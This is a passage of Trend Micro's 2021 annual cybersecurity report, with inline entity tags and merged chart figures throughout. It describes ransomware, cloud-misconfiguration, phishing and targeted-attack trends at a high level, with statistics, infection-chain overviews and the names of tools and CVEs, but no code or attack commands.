, as cybercriminals proved savvy to opportunities for abuse and attack , including those that had emerged since the onset of the Covid-19 pandemic . Modern ransomware actors grew more ambitious and deliberate with their attacks , and set their sights on more profitable targets . Going beyond indiscriminately going after their victims , operators running ransomware families like REvil1 and [PERSON] Conti2 eschewed automated attacks in favor of a more hands - on , long - haul approach to carefully tailor their campaigns to entities in critical industries . Targeted attacks gained popularity among different kinds of malicious actors , including those in cyberespionage and cybermercenary groups , who were armed with upgraded toolboxes that made their operations even more effective . Attacks from the likes of [PERSON] Void [PERSON] Balaur3 and [PERSON] Tropic [PERSON] Trooper4 demonstrated how these groups were capable of developing customized tools and were adept at red teamwork . Phishing scams remained a staple in these cyberattacks , in part because the influx of news about the global pandemic gave malicious actors ideas for new lures that resonated with a wider pool of potential victims . Any cracks in an organization \u2019s security posture could be devastating for business continuity , as could be seen from the rise in and impact of critical vulnerabilities in [DATE] 2021 . The growth of the underground exploit market proved that , left unpatched , older flaws could still inflict as much damage on infected systems as newly discovered ones . Malicious actors continued to employ flaws both old and new in their campaigns , as in the Squirrelwaffle loader \u2019s use of the [ORG] ProxyLogon and [ORG] ProxyShell vulnerabilities,5 and the [ORG] Khonsari ransomware attacks that incorporated the [ORG] Log4Shell vulnerability.6Pressing security issues also continued to plague organizations - turned - cloud - adopters . Most of the challenges in cloud security in [DATE] 2021 could be attributed to misconfigurations in the setup of cloud environments , as evidenced by how TeamTNT abused incorrectly configured servers to compromise [ORG] Docker [ORG] Hub accounts . TeamTNT was one of the [ORDINAL] first cybercriminal groups to focus primarily on cloud service providers ( CSPs ) , signaling a growing interest in the cloud within cybercriminal circles . From large - scale ransomware campaigns to high - risk vulnerabilities , the far - reaching impact of these security incidents showed that no user , enterprise , or industry was immune to compromise . The massive disruptions caused by high - profile attacks underscored the need for visibility over the ever- evolving attack surface across an organization \u2019s entire digital infrastructure . The defenses that might have sufficed in a prepandemic world stood to be reevaluated , if not redefined , in the face of mounting risks that could be averted only by an adaptive threat monitoring , detection , and response strategy with which organizations could continuously assess and enhance their security postures . This [DATE] annual cybersecurity report explores the notable events and emerging trends that shaped the cybersecurity landscape of [DATE] 2021 , during which [ORG] Trend [ORG] Micro protected its customers from over 94 billion threats . We hope that this roundup can provide organizations and end users alike with valuable insights they can use to make informed decisions about their security infrastructure and policies as they navigate and move forward in an ever - changing threat landscape . [ORG] Modern [ORG] Ransomware [ORG] Actors [ORG] Continue to [ORG] Target [ORG] Critical IndustriesOver the years , we have observed how ransomware has evolved significantly . In [DATE] 2018 , a spray - and - praystrategy was the norm among malicious actors , who wanted to profit from as many victims as possible.7However , our researchers foresaw how ransomware operators would pivot away from such a quantity - based tactic and become more deliberate in [ORG] their [ORG] movements.8 [ORG] Notably , in [DATE] 2021 ransomware operatorsstaged attacks on more profitable targets , leading to business disruptions with real - world ramificationsfelt on a global scale.9Already strained by the pandemic , healthcare organizations were hit hard by ransomware attacks in 2021,which were just behind the banking and government industries in terms of ransomware detections . A2021 report suggests that because healthcare organizations are less likely to back up their data thanthose in other industries , they are more prone to paying the demands of ransomware actors.10 Moreover , the healthcare industry has a trove of data that attackers seek to sell or use for extortion , including patientrecords with social security numbers , medical histories , and financial information.112020202120,98615,2347,768BankingGovernmentManufacturing19,57016,89412,477GovernmentBankingHealthcare05K10K15K20K25K05K10K15K20K25KFigure [CARDINAL] 1 . The top [CARDINAL] three industries in terms of ransomware file detections in [DATE] 2021 and [CARDINAL] 2020Source : Trend Micro Smart Protection Network4 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual Cybersecurity ReportAttempted WannaCry infections topped the list of ransomware detections across all [CARDINAL] three of the mostaffected industries , outpacing other ransomware families by a wide margin . The spray - and - pray approachused by legacy ransomware like [ORG] WannaCry might account for its large volume of attacks , but notably , modern ransomware gained ground . GovernmentWannaCry 16,969Banking [ORG] WannaCry 15,640HealthcareWannaCry 4,930GandCrab96GandCrab103LockBit550Cerber86MountLocker66Maze33805K10K15K20K05K10K15K20K05K10K15K20KFigure 2 . The top [CARDINAL] three ransomware families that affected the top [CARDINAL] three affected industries in [CARDINAL] 2021Source : Trend Micro Smart Protection NetworkUnlike their premodern counterparts , modern ransomware groups displayed erratic activity as they closedin on specific targets rather than cast a wide net,12 which is most likely why we observed a [PERCENT] 21 % decreasein overall ransomware detections in [DATE] 2021 . We observed several modern ransomware groups ramp up theiractivities [DATE] last [DATE] year : Year [DATE] - [DATE] on [DATE] - [DATE] year detections of [ORG] REvil ( also known as [GPE] Sodinokibi ) soared by 143 % , therewere over [CARDINAL] 20 times as many detections of [ORG] LockBit in [DATE] 2021 as there were in [DATE] 2020 , and detections of Contirose more than ninefold from the previous year.20202021REvilLockBitConti2,2785,535 1272,7121831,760143%2,035%862%01K2K3K4K5K6KFigure 3 . A year - on - year comparison of the top [CARDINAL] three modern ransomware familiesin terms of file detections in [DATE] 2020 and 2021Source : Trend Micro Smart Protection Network5 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual Cybersecurity [ORG] ReportAnother factor that might have played into the decline in ransomware detections was the marked increasein our detections and blocking of malware tools like the Cobalt Strike beacon [PRODUCT] CoBeacon , the trojanTrickbot , and the information stealer [PRODUCT] BazarLoader . Our blocking of larger numbers of these affiliate toolsmight have prevented ransomware operators from staging full - blown attacks in [DATE] 2021 , as the presence ofsuch tools is an early indicator of infection . In [DATE] 2021 , there was an eightfold rise in detections of [PRODUCT] CoBeacon , which had been abused by operators of ransomware families such as [ORG] DoppelPaymer , Povlsomware , andRyuk.13 Detections of Trickbot , which had been linked to the Conti ransomware14 as well as Ryuk,15 sawa [PERCENT] 23 % year - on - year increase . Most notably , detections in [DATE] 2021 of [PRODUCT] BazarLoader , which had been used togain initial access to systems by the likes of [ORG] Conti16 and Ryuk,17 were up by 2,468 % from [DATE] the [DATE] previous [DATE] year . Because modern ransomware has more human involvement , collaboration among cybercriminals hasgained traction in the underground , as evidenced by the rising trend of ransomware - as - a - service ( [CARDINAL] RaaS).RaaS affiliate programs have been beneficial for all cybercriminal parties involved : By bringing partnersonboard to divide the labor , ransomware actors can more efficiently profit from a victim \u2019s compromisedassets.18 The proliferation of RaaS has not only made ransomware more accessible even to maliciousactors with limited technical knowledge but also given rise to higher specialization within the cybercrimeecosystem . In splitting the work among themselves , RaaS affiliates have been able to hone their skills andfocus on certain specialties like penetrating networks or running the malware.19The widespread use of RaaS is a result of the ongoing evolution of the flourishing cybercrime - as - a - servicemarket , which continues to develop new business models for attackers . [CARDINAL] One such development is thegrowing demand for access - as - a - service ( AaaS ) , with access brokers peddling stolen credentials in thecriminal underground and finding reliable customers in ransomware actors , who use their wares to infecttarget systems.20Another trend that has caught on within cybercriminal circles is the incorporation of double extortion , inwhich ransomware actors not only demand a sum to restore access to a victim \u2019s encrypted files but alsothreaten to release the sensitive data upon failure of payment . This tactic was [ORDINAL] first perpetrated in [DATE] 2019 bythe [ORG] Maze ransomware and has since become even more widely used . As of [DATE] June [DATE] 2021 , as many as 35ransomware families employed double extortion . Some , including [ORG] REvil and [ORG] Conti , augmented their [ORG] RaaSoperations with this extortion technique to pursue big - name targets.21Since it was discovered by [PERSON] Cisco [PERSON] Talos in [DATE] 2019 , [ORG] REvil has become one of the most active RaaS families.22In [DATE] 2021 , it continued its use of double extortion on multinational enterprises like [GPE] Apple,23 JBS,24 andKaseya25 to great effect . The bulk of [ORG] REvil attacks took place in the [GPE] US , but countries like [GPE] Mexico andGermany were also affected.6 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity [ORG] ReportBased on our telemetry , [ORG] REvil attacks were aimed at critical industries . Most were levied against thetransportation industry , followed by organizations in the financial and the oil and gas industries . In ourreport on ransomware activity during [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 , we posited that the transportation industrybore the brunt of [ORG] REvil attacks likely because it played an important part in global supply chains andlogistics.26REvil \u2019s customized attacks suggest that its operators have extensive knowledge of their targets \u2019 ITenvironments . The efficiency of [ORG] REvil can also be attributed to its diverse toolbox . This includes the useof [PERSON] Qakbot , [PERSON] AdFind , [ORG] BloodHound , and other [ORDINAL] third - party sync tools , and the exploitation of vulnerabilitieslike CVE-2021 [ORG] - 30116 , which affects [ORG] Kaseya [ORG] VSA servers ; CVE-2019 [DATE] - 2725 , a deserialization vulnerabilityin [ORG] Oracle [ORG] WebLogic ; [ORG] the [ORG] FortiGate [ORG] SSL [ORG] VPN flaw CVE-2018 [ORG] - 13379 ; and [PRODUCT] the [PRODUCT] Pulse [PRODUCT] Secure [PRODUCT] SSL [PRODUCT] VPNvulnerability CVE-2019 - 11510.27Initial accessRDP / Valid accountsExploitSpam emailExecution and lateral [PERSON] movementPsExecDefense evasion , discoveryPC HunterREvil / SodinokibiransomwareProcess HackerDownload and executionKillAVDrive - by compromiseCertUtilPowerShellMacroFigure [CARDINAL] 4 . REvil \u2019s infection chainAnother notorious RaaS , called [PERSON] Conti , which we believe to be a successor of [ORG] Ryuk , was behind manydebilitating attacks around the world in [CARDINAL] 2021.28 In the [GPE] US alone , there were [CARDINAL] more [CARDINAL] than [CARDINAL] a [CARDINAL] million Contiattacks [DATE] between [DATE] January [DATE] 1 [DATE] and [DATE] November [DATE] 12 , [CARDINAL] 2021.29 As noted in our [DATE] 2021 [DATE] midyear cybersecurity report , this modern ransomware family had the [ORDINAL] tenth highest number of attack attempts during [DATE] the [DATE] first [DATE] half of2021.30 The bulk of these occurred in the [GPE] US , followed by the [GPE] Netherlands and [GPE] Taiwan . Retail organizationsexperienced the most [PERSON] Conti attacks . The insurance , manufacturing , and telecommunications industrieswere also hit hard , but [ORG] Conti \u2019s high - profile attacks on healthcare organizations was what made majorheadlines last year.317 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity [ORG] ReportLike [ORG] REvil \u2019s , [ORG] Conti \u2019s operators also take advantage of double extortion , threatening to release stolendata and selling access to infected systems if their victims fail to pay the ransom . They employ a varietyof exploits , such as those of the [PRODUCT] PrintNightmare and [PERSON] Zerologon vulnerabilities , and tools and malware , including familiar names like [ORG] BazarLoader , Cobalt Strike , [PERSON] Mimikatz , and Rclone . Working in concert , these enable [ORG] Conti operators to gain remote access to a targeted system , disable the system \u2019s securitysoftware , locate and exfiltrate valuable data , and encrypt files to make them inaccessible until the ransomdemand is met . Initial entry and executionPrivilege escalationCommand and controlFirewall exploitCobalt StrikePrintNightmareZerologonValid accountsAnyDeskPhishing emailBazarLoader/ BazarBackdoorCredential accessLateral movementNetwork discoveryNetscanShareFinderKerberoastingNet - GPPPasswordKerberoastingAnyDeskProcDumpProcDumpProcDumpPSExecFigure [CARDINAL] 5 . [ORG] Conti \u2019s infection chainImpactContiLateral movement anddefense evasionCreate scheduledtask on remote [GPE] systemsCobeacon , [GPE] KillAV , ContiKillAVEx\ufb01ltrationRclone8 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity [ORG] ReportCloud [ORG] Adopters and Remote Workers Contend With Rising Threats to [PERSON] Cloud [PERSON] EnvironmentsThreats to cloud security were among the most pressing IT infrastructure risks for organizations in [CARDINAL] 2021,according to [ORG] the [ORG] Cyber [ORG] Risk [ORG] Index for [DATE] the [DATE] first [DATE] half of [CARDINAL] 2021.32 Protecting their cloud architecture is a challengefor companies because many of the technologies that compose this architecture are regularly updatedwith new features.33 On top of these complexities , defenders must keep up with the tools malicious actorsuse to target the cloud , which are also constantly changing . For instance , in [DATE] 2019 , steganography , or thepractice of hiding code within an image , was a trend in cloud attacks.34 [DATE] The [DATE] following [DATE] year , maliciousactors used valid and clean images that downloaded malware onto affected systems after deployment . And as detailed in our [DATE] midyear cybersecurity report , in [DATE] 2021 attackers reverted to using images withmalicious content.35Malicious Actors Continue to Take Advantage of Cloud MisconfigurationsThe cloud has helped many organizations accelerate their digital transformations and embrace remote workduring the Covid-19 pandemic . Spending on cloud infrastructure , including cloud computing and storagesolutions , saw a 6.6 % year - on - year increase in [DATE] the [DATE] third [DATE] quarter [DATE] of [DATE] 2021 , which amounted to US$ [MONEY] 18.6billion , and [DATE] 2021 saw an overall growth in cloud - related expenditure , according to [ORG] the [ORG] International [ORG] DataCorporation.36However , malicious actors were quick to capitalize on this push toward digitization , as securing the cloudcomes with its share of complexities . Cloud environments continued to be at risk of compromise at thehands of cybercriminals who were out to abuse any misconfigurations , which proved to be major weakspots of cloud security even though CSPs had endeavored to make cloud services safer by recommendingthat all customers follow the shared responsibility model.37Fortifying the security postures of cloud environments that use services like those of [NORP] Amazon Web Services(AWS ) , [ORG] Microsoft [ORG] Azure , and Google Cloud Platform ( GCP ) \u2014 the [CARDINAL] three biggest CSPs in the world38 \u2014 should be a top priority for cloud adopters , for whom misconfigurations might not only lead to costly databreaches but also run up expenses from idle instances and unused storage.39 According to [DATE] 2021 data9 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual Cybersecurity Reportfrom Trend Micro Cloud One \u2122 \u2013 Conformity , [ORG] Amazon [ORG] Elastic [ORG] Block [ORG] Store , a block storage service , hadthe highest number of configuration failures among AWS services , with a misconfiguration rate of [ORG] 29%.Virtual [ORG] Machines had the most misconfigurations among Azure services , with a 65 % misconfigurationrate , while [ORG] Identity [ORG] and [ORG] Access [ORG] Management ( IAM ) pulled in the most misconfigurations among [ORG] GCPservices , with a 98 % misconfiguration rate.30,920,763 rate2,671,588 rate2,569,233 rate5,819,174 rule [GPE] checks7,531,008 rule checks104,822,208rule checksAmazon Elastic [GPE] Block Store(Amazon EBS)Amazon [PERSON] Simple [PERSON] Storage Service(Amazon S3)AWS CloudFormationFigure [CARDINAL] 6 . The misconfiguration rates for the top [CARDINAL] three AWS services in terms of rule checks in [CARDINAL] 2021Source : Trend Micro Cloud One \u2122 \u2013 Conformity2,244,741 rule checks640,196 rule checks3,448,582rule checksVirtual [ORG] MachinesStorage accountsApp ServiceFigure 7 . The misconfiguration rates for the top [CARDINAL] three [ORG] Microsoft [ORG] Azure services in terms of rule checksin [CARDINAL] 2021Source : Trend Micro Cloud One \u2013 Conformity64,655 rule checksVPC(Virtual Private Cloud)66,273 rule checksCloud IAM1,106 rule checksCloud SQLFigure 8 . The misconfiguration rates for the top [CARDINAL] three GCP services in terms of rule checks in [CARDINAL] 2021Source : Trend Micro Cloud One \u2013 Conformity10 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity ReportOne misconfiguration that was frequently abused by malicious actors in [DATE] 2021 was found in the RESTAPIs of [PERSON] Docker , a software platform used to build , test , and deploy software applications . Incorrectlyconfigured servers with exposed [ORG] Docker [ORG] REST APIs became a prime target for the cybercriminal groupTeamTNT , which abused [ORG] the [ORG] Docker [ORG] REST APIs by using compromised [ORG] Docker [ORG] Hub accounts to deploymalware like cryptocurrency [PERSON] miners.40The growing adoption of cloud - based software and services has put the cloud in the crosshairs of maliciousactor groups like TeamTNT , which was among the [ORDINAL] first groups to target CSPs in their campaigns , primarilyto steal CSPs \u2019 environmental metadata . Upon analyzing their recent campaigns , we found that the grouphad augmented its repertoire of tools , which enabled it to launch more modular attacks on specificvictims . [CARDINAL] 41ScannerList of targets(e.g . , IP addresses)Scan resultsExploitable securityPayload deliveryweaknessExploitablesecurity weaknessVictimFigure [CARDINAL] 9 . TeamTNT \u2019s attack chainThis group was also the perpetrator behind a cryptocurrency - mining and credential theft campaignthat targeted [ORG] Kubernetes , a widely used container management platform , from [DATE] March to May 2021.By exploiting a role - based access control misconfiguration as an entry point for its attacks , TeamTNTwas able to take over multiple [ORG] Kubernetes clusters . This resulted in the compromise of [CARDINAL] nearly [CARDINAL] 50,000 IPaddresses , most of which were in [GPE] China and the US.42Email Threats Climb as More Organizations Adopt Remote WorkSince the onset of the pandemic , internet and email usage had been even more instrumental for businesscontinuity and remote work . As email became an even more useful tool for people around the world whowere working from home , malicious actors seized the opportunity to take advantage of remote workers\u2019increased dependence on online communication . In [DATE] 2021 , [ORG] Trend [ORG] Micro [ORG] Cloud [ORG] App [ORG] Security , an API - basedsolution that protects both users and organizations from threats to their cloud - based apps and services , detected and blocked [CARDINAL] more [CARDINAL] than [CARDINAL] 25.7 [CARDINAL] million email threats , a marked increase from the over [CARDINAL] 16.7 millionthreats that the solution detected and blocked the previous year.11 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual Cybersecurity ReportEmail remained an oft - used avenue for cybercriminals to stage their attacks . In fact , 92 % of malwarewas delivered through email in [CARDINAL] 2021.43 Phishing emails in particular were responsible for 90 % of [CARDINAL] 2021\u2019sdata breaches.44 Phishing campaigns persisted as an effective means to spread malware , especiallyransomware , in [DATE] 2021 , as proved by the enduring success of [PERSON] Emotet , the notorious botnet - malware - turned - RaaS. Authorities took down [PERSON] Emotet in [DATE] November [DATE] 2021 , but its absence was short - lived , as itresurfaced toward the end of the year.45 Its yearslong use by ransomware groups like [ORG] Ryuk and trojans likeTrickbot showed how much the underground economy had grown and continued to evolve , to the pointthat it eventually developed its own supply chain.46Phishing attempts that were detected and blocked by [ORG] Trend [ORG] Micro [ORG] Cloud [ORG] App [ORG] Security in [DATE] 2021 nearlydoubled from those in [DATE] 2020 . Of these , 62 % were from spam emails , which increased nearly sevenfoldfrom [DATE] the [DATE] previous [DATE] year . The remaining 38 % were credential - phishing attempts , which grew by [PERCENT] 14 % from2020 . ( Credential phishing involves cybercriminals \u2019 use of fake login pages to gull potential victims intohanding over their account credentials , whereas phishing by spam email is a broader category that aimsto get user information . ) The finance industry experienced the most phishing attempts , followed closelyby the healthcare and education industries . Spam phishingCredential phishing1,458,35510,118,433 [CARDINAL] 5,465,9696,225,719 2M0202020214M6M8M10M12MFigure 10 . A comparison of the detections of spam phishing and credential - phishing attemptsin [DATE] 2020 and [CARDINAL] 2021Source : Trend Micro Cloud App Security12 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual Cybersecurity ReportFinanceHealthcareEducationAcademic researchRetailManufacturingHospitalityTransportationOthers3,448,9903,427,4513,205,4622,306,0791,349,6331,277,8241,268,634987,0312,406,736Figure [CARDINAL] 11 . The industries with the highest detections of spam phishing and credential - phishing attempts0500K1M1.5M2M2.5M3M3.5Min [CARDINAL] 2021Source : Trend Micro Cloud App SecurityDespite a slight increase during [DATE] the [DATE] first [DATE] half [DATE] of [DATE] the [DATE] year , possibly as a result of more attacks on businessesand supply chains related to vaccine production,47 detections of attempts at business email compromise(BEC ) totaled [CARDINAL] 282,775 in [DATE] 2021 , dropping [PERCENT] 11 % from [DATE] the [DATE] previous [DATE] year \u2019s BEC detections . Malicious actors turned to increasingly sophisticated [ORG] BEC attempts , focusing on improving the qualityof their email content rather than on churning out a high volume of attack attempts . Though there werefewer [ORG] BEC attempt detections in [DATE] 2021 , [ORG] Trend [ORG] Micro [ORG] Cloud [ORG] App [ORG] Security found and blocked [CARDINAL] 133,541 [ORG] BECemails using authorship analysis , while the remaining [CARDINAL] 149,234 were detected using behavior and intentionanalysis . The former , which could be detected only by comparing the spoofing email with the writingstyle of the supposed sender , made up 47 % of all [ORG] BEC attempts in [DATE] 2021 , whereas the [CARDINAL] 73,210 that weredetected in [DATE] 2020 composed [PERCENT] only [PERCENT] 23 % of all [ORG] BEC attempts found that year.13 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity Report73,210244,364133,541149,23420202021Authorship analysis Behavior and intention analysis050K150K250K350KFigure [CARDINAL] 12 . A comparison of the proportions of [ORG] BEC attempts blocked based on authorship analysisand [ORG] BEC attempts blocked based on behavior and intention analysis in [DATE] 2020 and 2021Source : Trend Micro Cloud App SecurityThe greatest numbers of [ORG] BEC attempts were aimed at the retail and consulting industries . The retailindustry remained an appealing target for financially motivated cybercriminals , especially phishingfraudsters , owing to the wealth of customer payment data , credentials , and other personal informationthat retailers held.4834,536RetailConsultingEducationShippingManufacturingTransportationHealthcareGovernmentOthers27,77016,51416,08813,27411,44711,3479,04223,75705K10K15K20K25K30K35KFigure [CARDINAL] 13 . The industries with the highest detections of [ORG] BEC attempts in [CARDINAL] 2021Source : Trend Micro Cloud App Security14 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity ReportIn 2021 , the information and communication industry was the most common target of malware - ladenemails . While many businesses struggled during the pandemic , this industry continued to grow and isexpected to be valued at over US$ 11.9 [MONEY] trillion by [DATE] 2025 , which might explain why it had been in thecrosshairs of attackers.49 Retail companies were also on the receiving end of many emails with malware . Retailers drew the attention of more attackers after the industry experienced rapid growth when onlinesales surged as a result of the pandemic.50 Malicious email attachments were also a common means forcybercriminals to carry out attacks on construction firms , which were appealing targets because of theirvaluable intellectual properties , such as blueprints , that could be used to bypass buildings \u2019 security.51Information and communicationRetailConstructionFinanceManufacturingHealthcareTechnologyTransportationOthers561,753397,072356,952198,408188,373150,002148,090143,625146,4990100K200K300K400K500K600KFigure [CARDINAL] 14 . The industries with the highest detections of malware files in emails in [CARDINAL] 2021Source : Trend Micro Cloud App Security15 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual Cybersecurity ReportTargeted Attacks Take Aim at Bigger Game With Upgraded ArsenalWith more malicious actors moving past the indiscriminate distribution of their malware , [DATE] 2021 saw certainindustries fall prey to targeted attacks . An enduring threat that has plagued organizations as far back [ORG] as2012,52 targeted attacks require a high level of technical expertise and a plethora of resources on the partof threat actors , because the tools and techniques involved need to be tailored to the intended victims\u2019systems.53During [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 , we observed a shift to more targeted modern ransomware that veeredaway from quantity - based attacks and toward more profitable prey,54 as more cybercriminals resorted toincreasingly advanced tools and techniques that pointed to a targeted approach . Not only can this kindof attack have a direct impact on the targeted organization , but its effects can also be felt by the victim\u2019scustomers because of any resulting business disruption or customer information leakage.55 The threatactors behind a targeted attack may be financially motivated , but its main goal is data theft.56Void Balaur Stages Attacks on Government Entities and Other TargetsAlso known as [ORG] Rockethack , [PERSON] Void [PERSON] Balaur is a cybermercenary group that deals largely in data theft andcyberespionage , advertising its services in the [LANGUAGE] Russian - speaking cybercriminal underground throughforums and websites like Darkmoney and Probiv . In [DATE] past [DATE] years , we observed this group launch attacks onthe telecommunications , retail , financial , medical , and biotechnology industries . They continued pursuingtelecommunications organizations in [DATE] 2021 , when we discovered that [PERSON] Void [PERSON] Balaur had been targetingengineers and management officers of various [NORP] Russian and [GPE] UK telecommunications outfits.5716 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual Cybersecurity ReportAlthough the hackers - for - hire behind the group are driven by monetary gain , they have also frequentlytargeted journalists , human rights activists , and government officials . For instance , in [DATE] September 2021,we found [PERSON] Void [PERSON] Balaur targeting a former head of an intelligence agency , [CARDINAL] two members of the nationalparliament , and [CARDINAL] five active government ministers of an [NORP] Eastern [NORP] European country . This suggests thattheir activities might play into a larger campaign on multiple fronts to cause widespread disruption . Manyof their targets are based in [GPE] Russia and its neighboring countries , although [PERSON] Void [PERSON] Balaur activity has alsobeen spotted in other [NORP] European countries , the [GPE] US , [GPE] Japan , and [GPE] Israel . Among [PERSON] Void [PERSON] Balaur \u2019s main services is hacking into email and social media accounts . For a higher fee , thegroup can also supply the complete copies of stolen email inboxes without the users \u2019 knowledge . In [CARDINAL] 2019,it began selling the confidential information of [NORP] Russian individuals , such as their criminal records , credithistories , bank statements , text messages , and passport and flight data . [PERSON] Void [PERSON] Balaur uses specializedmalware like [ORG] Z*Stealer and DroidWatcher , capable of remote tracking , accessing location information , and stealing user credentials for different apps and digital currency wallets.58Tropic [ORG] Trooper [ORG] Returns to Attack the Transportation and Government [NORP] IndustriesThe cyberespionage group [ORG] Tropic [ORG] Trooper , which now goes by [LOC] Earth [LOC] Centaur , has been active [ORG] since2011 but it resurfaced in [DATE] July [DATE] 2020 with new tools , including modified remote access trojans ( RATs).Toward [DATE] the [DATE] end [DATE] of [DATE] 2020 and continuing in [DATE] 2021 , we observed it using these tools to target transportationbusinesses and transport - related government organizations.59 Its attacks commonly involve informationtheft \u2014 including that of financial documents , search histories , and flight schedules \u2014 from compromisedsystems . Based on our analysis , we predict that [ORG] Tropic [ORG] Trooper will continue gathering confidential datawhile waiting for the opportune time to capitalize on it . Tropic Trooper usually breaches its victims \u2019 systems by exploiting vulnerabilities in their [ORG] Microsoft [ORG] InternetInformation [ORG] Services and Exchange servers , and then installing web shells that execute backdoorssuch as ChiserClient and [ORG] SmileSvr . The group uses a customized variant of Gh0st [ORG] RAT to discover andcollect information from active sessions on an infected host , which it then exfiltrates using the victim\u2019scompromised intranet . The threat actors behind [ORG] Tropic [ORG] Trooper have proved themselves talented at red teamwork . By usingopen - source frameworks , they have developed various backdoors with different protocols , which theyhave used to bypass their victims \u2019 security settings . They also employ reverse proxies to avoid detectionby network security systems.17 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity ReportMore Malicious Actors Use BazarLoader as an Arrival MechanismDuring [DATE] the [DATE] third [DATE] quarter [DATE] of [DATE] 2021 , we observed an uptick in the use of [PRODUCT] BazarLoader , an information stealerand loader that we detected as [ORG] TrojanSpy . Win64.BAZARLOADER and [ORG] Backdoor . Win64.BAZARLOADER.The highest detections of [PRODUCT] BazarLoader took place in the [LOC] Americas region.60Since it was [ORDINAL] first observed in [CARDINAL] 2020,61 [PRODUCT] BazarLoader has been used by cybercriminals to gain initial accessfor data theft or to deploy [ORDINAL] second - stage malware like ransomware . [DATE] Between [DATE] January [DATE] and [DATE] October [DATE] 2021,BazarLoader campaigns that used malicious spam emails as an arrival mechanism primarily targeted theUS , followed by select [NORP] European and [NORP] Asian countries . Most of these emails took the form of fraudulentorder invoices and notices of service plan termination . On the other hand , campaigns that used [ORG] JavaScriptdroppers to deliver [ORG] BazarLoader over the same period focused on targets in the [GPE] US and [GPE] Australia . Notably , malicious actors use different arrival mechanisms to deliver [ORG] BazarLoader as part of their attacks . In [CARDINAL] one method , [ORG] BazarLoader is bundled with a legitimate program and deployed using a software installer , such as that for [ORG] VLC and [ORG] TeamViewer . Its delivery mechanism possibly involves social engineering asa means of tricking victims into downloading the compromised installer . A [ORG] BazarLoader executable isthen dropped while the installer is loading . The installer creates a process that runs the BazarLoaderexecutable and then establishes a connection with a command - and - control ( [ORG] C&C ) server using [ORG] MicrosoftEdge . Other malicious actors favor a method that involves delivery by way of an [ORG] ISO file that contains a WindowsLNK ( link ) file . The [ORG] LNK file is disguised as a folder icon to trick a victim into clicking it , which runs itsBazarLoader dynamic - link library ( [ORG] DLL ) payload . [PERSON] Qakbot [PERSON] Reemerges With an Improved VariantDiscovered in [CARDINAL] 2007,62 the information stealer [PERSON] Qakbot , which is detected by [ORG] Trend [ORG] Micro asTrojanSpy . Win32.QAKBOT , has become popular among ransomware operators as a piece of malware - installation - as - a - service botnet malware for their campaigns . In [DATE] 2019 , [PERSON] Qakbot infections were used in thedeployment of manually operated ransomware families like [ORG] MegaCortex , [ORG] PwndLocker , [ORG] Egregor , [ORG] ProLock , and , most recently , [ORG] REvil / Sodinokibi.63Following a [DATE] three [DATE] - [DATE] month hiatus , [PERSON] Qakbot operators resumed their email spam run in [DATE] September 2021.Their campaign returned with a new version of [PERSON] Qakbot that uses [PERSON] Visual [PERSON] Basic [PERSON] for [PERSON] Applications ( VBA)macros as well as [PRODUCT] Excel [PRODUCT] 4.0 macros . Over [DATE] the [DATE] past [DATE] years , we observed that spam campaigns linked [ORG] toQakbot operators mainly targeted the telecommunications , technology , and education industries . Amongthe top countries affected by these campaigns were the [GPE] US , [GPE] Japan , and Germany.18 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity ReportBuer Loader Becomes Better at Evading DetectionBuer Loader \u2019s competitive pricing made it the malware loader of choice for many threat actors when itwas introduced in the underground market in [DATE] 2019 . It remains active to [DATE] this [DATE] day and has been used bythreat actors to deploy well - known malware such as [ORG] Ryuk , [PERSON] Wizard [PERSON] Spider , and the [NORP] Cobalt [NORP] Strike beaconas part of targeted ransomware attacks.64 We found that [PERSON] Buer [PERSON] Loader was most active in [GPE] India , followedby [GPE] Israel , and that detections of the loader were highest among organizations in the healthcare , banking , and telecommunications industries . In [DATE] 2021 , a new variant of [PERSON] Buer [PERSON] Loader , written in Rust , was used in spam runs that involved emailswith malicious attachments containing the loader . [CARDINAL] One campaign used emails that masqueraded as [ORG] DHLshipping notices , while succeeding campaigns mentioned Covid-19 in their emails as a lure or referencedboth [ORG] DHL and Covid-19 . The Buer Loader variant used in these emails retains most of the same code asin previous variants , but it was likely rewritten in a new programming language to avoid detection . Thisupdated variant also uses signed [ORG] XLL ( Excel add - in ) files as another way to stay under the radar of theirvictims \u2019 IT teams . Water Basilisk Uses New Crypter Tool to Flood Systems With RATsAugust 2021 saw the height of activity for a fileless attack campaign called [PERSON] Water [PERSON] Basilisk , which bombardsits victims \u2019 systems with RATs \u2014 including [PRODUCT] BitRat , [PRODUCT] NjRat , [ORG] LimeRat , [GPE] Warzone , [ORG] QuasarRat , and NanocoreRAT \u2014 through a new [ORG] HCrypt variant.65 The operators behind [PERSON] Water [PERSON] Basilisk use this crypter - as - a - serviceto make obfuscated [ORG] VBScript and [ORG] PowerShell scripts that deploy their malicious payloads . We haveobserved [PERSON] Water [PERSON] Basilisk incidents that involve [ORG] PowerShell scripts containing [CARDINAL] as [CARDINAL] many [CARDINAL] as [CARDINAL] seven RATs.66Water Basilisk actors have been hosting their malware and phishing kits on publicly accessible file - hostingservices and compromised [ORG] WordPress websites . They use these [ORG] WordPress websites or phishing emailsto disseminate a malicious [ORG] ISO image . This image has an obfuscated VBScript stager that downloads andexecutes next - stage [ORG] VBScript content into an infected system . Finally , [ORG] PowerShell scripts deobfuscateand deploy their payload RATs in a given process . The [ORG] HCrypt version that [PERSON] Water [PERSON] Basilisk uses to propagate its malware is sold in underground markets [ORG] forUS$199 . 